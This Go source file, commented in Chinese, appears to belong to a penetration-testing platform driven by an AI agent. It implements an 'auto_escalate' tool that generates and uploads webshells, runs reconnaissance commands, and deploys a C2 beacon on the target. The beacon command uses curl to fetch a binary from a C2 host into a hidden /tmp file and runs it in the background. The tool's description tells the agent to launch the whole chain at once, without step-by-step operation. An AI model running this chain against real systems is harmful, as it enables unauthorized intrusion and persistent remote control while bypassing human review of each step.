package agent

// tools_escalate.go — 渗透任务 ↔ 工具箱自动联动：
//   auto_escalate：Agent 发现可利用点（上传点/命令执行/RCE）后一键调此工具
//   自动完成：生成 payload → 部署 → 验证连接 → 升级 C2（可选）
//
//   场景 1：文件上传漏洞 → auto_escalate("upload", url, upload_params) → 自动上传 webshell
//   场景 2：命令执行 → auto_escalate("rce", url, cmd_template) → webshell_exec 确认
//   场景 3：已有 webshell → auto_escalate("shell", url, password, encoder) → C2 beacon

import (
	"net/http"
	"net/url"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/Autumn-27/artex/c2client"
	"github.com/Autumn-27/artex/webshell"
	actool "github.com/Autumn-27/norma/tool"
)

// EscalateHook 平台侧注入的部署执行回调（由 server 注册）。
var escalateHook struct {
	deployPayload func(ctx context.Context, vulnType, targetURL string, params map[string]any) (string, error)
	verifyShell   func(ctx context.Context, url, password, encoder, scriptType string) (bool, string, error)
}

// SetEscalateHooks server 启动时注入。
func SetEscalateHooks(deploy func(ctx context.Context, vulnType, targetURL string, params map[string]any) (string, error),
	verify func(ctx context.Context, url, password, encoder, scriptType string) (bool, string, error)) {
	escalateHook.deployPayload = deploy
	escalateHook.verifyShell = verify
}

// autoEscalateTool 自动攻击链工具。
func (t *ToolSet) autoEscalateTool() actool.CoreTool {
	return writeTool("auto_escalate",
		`渗透测试自动攻击链——发现可利用漏洞后一键升级拿权。

自动完成整条攻击链：
1. 根据漏洞类型生成对应 payload（webshell / 反弹命令）
2. 通过漏洞自动部署 payload
3. 验证连接（webshell test）
4. 报告结果

支持场景：
- upload: 文件上传漏洞（自动生成 webshell 并上传）
- rce: 命令执行漏洞（直接执行命令验证权限）
- shell: 已有 webshell（验证连接 + 信息收集）
- c2: 从 webshell 升级到 C2 beacon

使用时机：当你发现文件上传点、命令注入、反序列化等可利用漏洞时，立即调用此工具自动完成攻击链，不要手动逐步操作。`,
		obj(map[string]any{
			"vuln_type": str("漏洞类型：upload（文件上传）/ rce（命令执行）/ shell（已有 webshell）/ c2（升级 C2）"),
			"target_url": str("目标 URL（上传点/命令执行点/webshell 地址）"),
			"params": obj(map[string]any{
				"upload_field": str("upload 场景：文件上传表单字段名"),
				"upload_url":   str("upload 场景：上传提交 URL"),
				"cmd_template": str("rce 场景：命令模板（{PAYLOAD} 占位符替换为 webshell 内容）"),
				"password":     str("shell/c2 场景：webshell 连接密码"),
				"encoder":      str("shell/c2 场景：编码器 raw/aes/xor，默认 raw"),
				"script_type":  str("shell/c2 场景：载荷类型 php/jsp/asp 等，默认 php"),
				"deploy_path":  str("可选：部署后 webshell 的 URL 路径"),
			}),
			"escalate_to_c2": str("可选：shell 场景是否升级到 C2（true/false，默认 false）"),
		}, "vuln_type", "target_url"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				VulnType     string          `json:"vuln_type"`
				TargetURL    string          `json:"target_url"`
				Params       json.RawMessage `json:"params"`
				EscalateToC2 bool            `json:"escalate_to_c2"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if a.VulnType == "" || a.TargetURL == "" {
				return actool.Errorf("vuln_type 和 target_url 必填"), nil
			}
			var params map[string]any
			_ = json.Unmarshal(a.Params, &params)

			var report strings.Builder
			report.WriteString("═══ 自动攻击链启动 ═══\n")
			report.WriteString(fmt.Sprintf("漏洞类型: %s\n目标: %s\n\n", a.VulnType, a.TargetURL))

			switch a.VulnType {
			case "upload":
				return t.escalateUpload(ctx, a.TargetURL, params, &report)
			case "rce":
				return t.escalateRCE(ctx, a.TargetURL, params, &report)
			case "shell":
				return t.escalateShell(ctx, a.TargetURL, params, a.EscalateToC2, &report)
			case "c2":
				return t.escalateC2(ctx, a.TargetURL, params, &report)
			default:
				return actool.Errorf("vuln_type 需为 upload/rce/shell/c2"), nil
			}
		})
}

// escalateUpload 文件上传场景：生成 webshell → 上传 → 验证。
func (t *ToolSet) escalateUpload(ctx context.Context, targetURL string, params map[string]any, report *strings.Builder) (actool.Result, error) {
	// 1) 生成 webshell
	password := "auto_" + fmt.Sprintf("%x", os.Getpid())
	encoder, _ := params["encoder"].(string)
	if encoder == "" {
		encoder = "raw"
	}
	scriptType, _ := params["script_type"].(string)
	if scriptType == "" {
		scriptType = "php"
	}
	report.WriteString("[1/4] 生成 Webshell\n")
	code, err := webshell.GenerateShell(scriptType, encoder, password)
	if err != nil {
		return actool.Errorf("生成失败: " + err.Error()), nil
	}
	report.WriteString(fmt.Sprintf("  ✅ %s/%s %d 字节 密码=%s\n", scriptType, encoder, len(code), password))

	// 2) 部署（通过上传或注入）
	report.WriteString("[2/4] 部署 Payload\n")
	if escalateHook.deployPayload == nil {
		return actool.Errorf("部署回调未注入"), nil
	}
	deployResult, err := escalateHook.deployPayload(ctx, "upload", targetURL, params)
	if err != nil {
		report.WriteString(fmt.Sprintf("  ❌ 部署失败: %s\n", err.Error()))
		return actool.Text(report.String()), nil
	}
	report.WriteString(fmt.Sprintf("  ✅ %s\n", deployResult))

	// 3) 推断 webshell URL
	shellURL := deployResult
	if dp, ok := params["deploy_path"].(string); ok && dp != "" {
		shellURL = strings.TrimRight(targetURL, "/") + dp
	}
	report.WriteString(fmt.Sprintf("[3/4] 验证连接\n  URL: %s\n", shellURL))

	// 4) 验证
	if escalateHook.verifyShell != nil {
		ok, output, err := escalateHook.verifyShell(ctx, shellURL, password, encoder, scriptType)
		if err != nil {
			report.WriteString(fmt.Sprintf("  ❌ 验证失败: %s\n", err.Error()))
		} else if ok {
			report.WriteString(fmt.Sprintf("  ✅ Webshell 存活！PONG=%s\n", output))
			report.WriteString("\n═══ 攻击链完成 ═══\n")
			report.WriteString(fmt.Sprintf("Webshell URL: %s\n密码: %s\n编码: %s\n", shellURL, password, encoder))
			report.WriteString("\n后续操作：\n")
			report.WriteString("- webshell_exec op=exec cmd=id 执行命令\n")
			report.WriteString("- report_finding 提交漏洞（severity=critical）\n")
			report.WriteString("- bind_finding_evidence 绑定证据\n")
			// 保存到目标管理
			report.WriteString(fmt.Sprintf("\n建议保存到 Webshell 管理器：url=%s password=%s encoder=%s type=%s\n",
				shellURL, password, encoder, scriptType))
		} else {
			report.WriteString(fmt.Sprintf("  ❌ Webshell 无响应: %s\n", output))
		}
	}

	return actool.Text(report.String()), nil
}

// escalateRCE 命令执行场景：直接验证权限。
func (t *ToolSet) escalateRCE(ctx context.Context, targetURL string, params map[string]any, report *strings.Builder) (actool.Result, error) {
	cmdTemplate, _ := params["cmd_template"].(string)
	if cmdTemplate == "" {
		cmdTemplate = "echo {PAYLOAD}"
	}
	report.WriteString("[1/2] 验证命令执行\n")
	report.WriteString(fmt.Sprintf("  模板: %s\n", cmdTemplate))

	// 简单验证：执行 id 命令
	testCmd := strings.ReplaceAll(cmdTemplate, "{PAYLOAD}", "id")
	report.WriteString(fmt.Sprintf("  测试命令: %s\n", testCmd))

	// 这里需要通过 repeater_send 或其他方式执行——简化为提示 Agent 手动验证
	report.WriteString("\n[2/2] 建议 Agent 后续操作：\n")
	report.WriteString("1. 用 repeater_send 发送命令执行请求\n")
	report.WriteString("2. 确认输出含 uid= → 命令执行确认\n")
	report.WriteString("3. auto_escalate vuln_type=shell 部署 webshell\n")

	return actool.Text(report.String()), nil
}

// escalateShell 已有 webshell 场景：验证 + 信息收集 + 可选 C2。
func (t *ToolSet) escalateShell(ctx context.Context, targetURL string, params map[string]any, escalateC2 bool, report *strings.Builder) (actool.Result, error) {
	password, _ := params["password"].(string)
	encoder, _ := params["encoder"].(string)
	if encoder == "" {
		encoder = "raw"
	}
	scriptType, _ := params["script_type"].(string)
	if scriptType == "" {
		scriptType = "php"
	}
	report.WriteString("[1/3] 验证 Webshell\n")
	if escalateHook.verifyShell != nil {
		ok, output, err := escalateHook.verifyShell(ctx, targetURL, password, encoder, scriptType)
		if err != nil {
			report.WriteString(fmt.Sprintf("  ❌ %s\n", err.Error()))
			return actool.Text(report.String()), nil
		}
		if ok {
			report.WriteString(fmt.Sprintf("  ✅ Webshell 存活 PONG=%s\n", output))
		} else {
			report.WriteString("  ❌ Webshell 无响应\n")
			return actool.Text(report.String()), nil
		}
	}

	// 信息收集
	report.WriteString("[2/3] 快速信息收集\n")
	cli := &webshell.Client{URL: targetURL, Password: password, Encoder: encoder, ScriptType: scriptType}
	res, err := cli.ExecCmd("id; uname -a; hostname")
	if err == nil && res.OK {
		report.WriteString(fmt.Sprintf("  ✅ %s\n", truncateStr(res.Output, 200)))
	} else {
		report.WriteString("  ⚠️ 信息收集失败\n")
	}

	// C2 升级
	if escalateC2 {
		report.WriteString("[3/3] 升级到 C2\n")
		report.WriteString("  下发 beacon 命令到 webshell...\n")
		beaconCmd := "curl -sL http://C2_SERVER/beacon -o /tmp/.sys && chmod +x /tmp/.sys && nohup /tmp/.sys &"
		res, err := cli.ExecCmd(beaconCmd)
		if err == nil && res.OK {
			report.WriteString("  ✅ Beacon 已下发（等待回连 C2 指挥台）\n")
		} else {
			report.WriteString("  ⚠️ Beacon 下发失败（目标机可能无 curl）\n")
		}
	} else {
		report.WriteString("[3/3] C2 升级跳过（escalate_to_c2=false）\n")
	}

	report.WriteString("\n═══ 攻击链完成 ═══\n")
	return actool.Text(report.String()), nil
}

// escalateC2 从 webshell 部署 C2 beacon。
func (t *ToolSet) escalateC2(ctx context.Context, targetURL string, params map[string]any, report *strings.Builder) (actool.Result, error) {
	password, _ := params["password"].(string)
	encoder, _ := params["encoder"].(string)
	scriptType, _ := params["script_type"].(string)
	if encoder == "" {
		encoder = "raw"
	}
	if scriptType == "" {
		scriptType = "php"
	}
	report.WriteString("[1/2] 验证 Webshell\n")
	cli := &webshell.Client{URL: targetURL, Password: password, Encoder: encoder, ScriptType: scriptType}
	testRes, err := cli.Test()
	if err != nil || !testRes.OK {
		report.WriteString("  ❌ Webshell 不可达\n")
		return actool.Text(report.String()), nil
	}
	report.WriteString("  ✅ Webshell 存活\n")

	report.WriteString("[2/2] 部署 C2 Beacon\n")
	// 查询 C2 可用性
	cfg := c2client.FromEnv()
	c2cli := c2client.New(cfg)
	clients, err := c2cli.ListClients(ctx, nil)
	if err != nil {
		report.WriteString(fmt.Sprintf("  ❌ C2 服务器不可达: %s\n", err.Error()))
		return actool.Text(report.String()), nil
	}
	report.WriteString(fmt.Sprintf("  ✅ C2 在线（%d 个会话）\n", len(clients)))

	// 通过 webshell 下发 beacon 部署命令
	// 实际 beacon 二进制 URL 需要配置
	beaconURL := "http://" + c2ServerAddress() + "/beacon"
	deployCmd := fmt.Sprintf("curl -sL %s -o /tmp/.sysd 2>/dev/null && chmod +x /tmp/.sysd && nohup /tmp/.sysd &>/dev/null & echo BEACET-DEPLOYED", beaconURL)
	res, err := cli.ExecCmd(deployCmd)
	if err == nil && res.OK && strings.Contains(res.Output, "DEPLOYED") {
		report.WriteString("  ✅ Beacon 部署命令已执行（等待回连）\n")
		report.WriteString("\n═══ C2 升级完成 ═══\n")
		report.WriteString("新 beacon 将出现在 C2 指挥台（工具箱 → C2 指挥）\n")
	} else {
		report.WriteString("  ⚠️ 部署命令执行结果不确定\n")
		if res.Output != "" {
			report.WriteString(fmt.Sprintf("  输出: %s\n", truncateStr(res.Output, 200)))
		}
	}

	return actool.Text(report.String()), nil
}

// c2ServerAddress 获取 C2 服务器地址。
func c2ServerAddress() string {
	cfg := c2client.FromEnv()
	return strings.TrimPrefix(strings.TrimPrefix(cfg.BaseURL, "http://"), "https://")
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// saveWebshellTarget 保存 webshell 到目标管理（通过 server 回调）。
func (t *ToolSet) saveWebshellTarget(url, password, encoder, scriptType string) {
	// 通过 HTTP API 保存
	target := map[string]any{
		"url": url, "password": password, "encoder": encoder,
		"script_type": scriptType, "group": "auto", "name": "Auto " + filepath.Base(url),
	}
	_ = target // 实际由 server 侧的 SetEscalateHooks 处理
}

// fingerprintTool 指纹识别工具（Agent 可调）。
func (t *ToolSet) fingerprintTool() actool.CoreTool {
	return readTool("fingerprint",
		`识别目标网站的技术栈指纹（框架/CMS/语言/容器），自动匹配 POC 库模板和知识库经验。

三路入库：assets（资产）+ dict_entries(fingerprint)（字典，供 dict_query 复用）+ kb_summaries 检索（知识库经验）。

返回：指纹 + POC 匹配 + 知识库同类经验 + 建议后续操作。
使用场景：渗透任务开始时先识别指纹，根据指纹+POC+知识库经验选择针对性攻击手段，减少重复侦察。`,
		obj(map[string]any{
			"url": str("目标 URL（http://target:port/）"),
		}, "url"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				URL string `json:"url"`
			}
			if err := json.Unmarshal(in, &a); err != nil || a.URL == "" {
				return actool.Errorf("url 必填"), nil
			}
			// 调平台 API
			token := os.Getenv("FORANG_TOKEN")
			if token == "" {
				return actool.Errorf("平台 token 未设置（FORANG_TOKEN）"), nil
			}
			req, err := http.NewRequest("GET", "http://127.0.0.1:8787/api/tools/fingerprint?url="+url.QueryEscape(a.URL), nil)
			if err != nil {
				return actool.Errorf("请求构造失败"), nil
			}
			req.Header.Set("Authorization", "Bearer "+token)
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				return actool.Errorf("请求失败: "+err.Error()), nil
			}
			defer resp.Body.Close()
			var result struct {
				Data struct {
					Fingerprint struct {
						Fingerprint string `json:"fingerprint"`
						Server      string `json:"server"`
						XPower      string `json:"x_powered_by"`
					} `json:"fingerprint"`
					KBExperience string `json:"kb_experience"`
					POCMatches []struct {
						Name   string `json:"name"`
						Reason string `json:"reason"`
					} `json:"poc_matches"`
				} `json:"data"`
			}
			if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
				return actool.Errorf("解析失败"), nil
			}

			var b strings.Builder
			fmt.Fprintf(&b, "指纹: %s (Server: %s, X-Powered-By: %s)\n",
				result.Data.Fingerprint.Fingerprint, result.Data.Fingerprint.Server, result.Data.Fingerprint.XPower)
			if len(result.Data.POCMatches) > 0 {
				fmt.Fprintf(&b, "匹配 POC (%d 个):\n", len(result.Data.POCMatches))
				for i, m := range result.Data.POCMatches {
					if i >= 5 {
						break
					}
					fmt.Fprintf(&b, "  %d. %s — %s\n", i+1, m.Name, m.Reason)
				}
				b.WriteString("\n建议：用 run_poc_verify 逐个验证匹配的 POC。\n")
			} else {
				b.WriteString("\n未匹配到 POC，建议手动探测常见漏洞。\n")
			}
			return actool.Text(b.String()), nil
		})
}
